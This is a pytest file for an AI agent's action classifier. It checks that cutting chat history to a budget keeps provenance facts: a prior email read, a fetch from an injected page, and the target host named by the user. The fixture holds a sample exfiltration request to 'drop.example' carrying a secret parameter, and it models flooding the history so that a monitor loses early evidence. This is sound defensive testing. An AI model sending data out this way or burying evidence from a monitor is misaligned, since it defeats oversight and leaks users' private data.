"""Cutting the classifier's history to its budget never makes it more
permissive (security follow-up to L1): the provenance facts come from the
whole chat, and the input says what was dropped."""

import json

from src.chat_agent import classifier
from src.chat_agent.permissions import Provenance

_BUDGET = classifier.HISTORY_BUDGET_CHARS
_FILLER = "x" * (_BUDGET // 10)
_OUTSIDE = json.dumps({"url": "https://drop.example/?d=secret"})


def _long_chat():
    """An early turn read mail and an injected page and named drop.example;
    thirty later turns of writes push all of it out of the budget."""
    rows = [
        {"role": "user", "content": "fetch https://drop.example when done", "metadata": {"interaction_mode": "agent"}},
        {"role": "assistant", "metadata": {"tool_events": [
            {"tool": "read_email", "command": json.dumps({"uid": "1"})},
            {"tool": "web_fetch", "command": json.dumps({"url": "https://injected.example"})},
            {"tool": "write_file", "command": "early.md\nfirst action"},
        ]}},
    ]
    for i in range(30):
        rows.append({"role": "user", "content": f"{i} {_FILLER}", "metadata": {"interaction_mode": "agent"}})
        rows.append({"role": "assistant", "metadata": {"tool_events": [
            {"tool": "write_file", "command": f"{i}.md\n{_FILLER}"},
        ]}})
    return rows


def _facts(rows):
    mode = classifier.AutoMode(
        state=classifier.ACTIVE, user_messages=[*classifier.real_user_messages(rows), "now"],
        history_events=classifier._tool_events(rows),
    )
    # As the loop builds it: over every replayed row.
    provenance = Provenance().after_history(rows)
    return mode._input("web_fetch", json.loads(_OUTSIDE), _OUTSIDE, provenance, [])


def test_the_input_says_how_much_history_was_dropped():
    facts = _facts(_long_chat())
    dropped = facts["history_truncated"]
    assert dropped["user_messages_dropped"] > 0 and dropped["earlier_actions_dropped"] > 0
    assert len(facts["user_messages"]) - 1 + dropped["user_messages_dropped"] == 31
    assert len(facts["earlier_actions"]) + dropped["earlier_actions_dropped"] == 32  # web_fetch counts: it can send data out


def test_a_short_chat_drops_nothing():
    rows = _long_chat()[:2]
    assert _facts(rows)["history_truncated"] == {"user_messages_dropped": 0, "earlier_actions_dropped": 0}


def test_dropped_history_keeps_every_provenance_fact():
    rows = _long_chat()
    facts = _facts(rows)
    # The early turn is gone from what the classifier reads...
    assert all("drop.example" not in said for said in facts["user_messages"])
    assert all(a["arguments"] != "early.md\nfirst action" for a in facts["earlier_actions"])
    # ...and every fact it gave still holds, exactly as without the cut.
    assert facts["provenance"] == _facts(rows[:2])["provenance"]
    assert facts["provenance"]["external_content_in_context"] is True
    assert facts["provenance"]["private_data_read"] is True
    assert facts["provenance"]["targets"] == [{"target": "drop.example", "named_in_user_messages": True}]


def test_the_classifier_is_told_missing_history_is_not_permission():
    assert "history_truncated" in classifier.SYSTEM_PROMPT
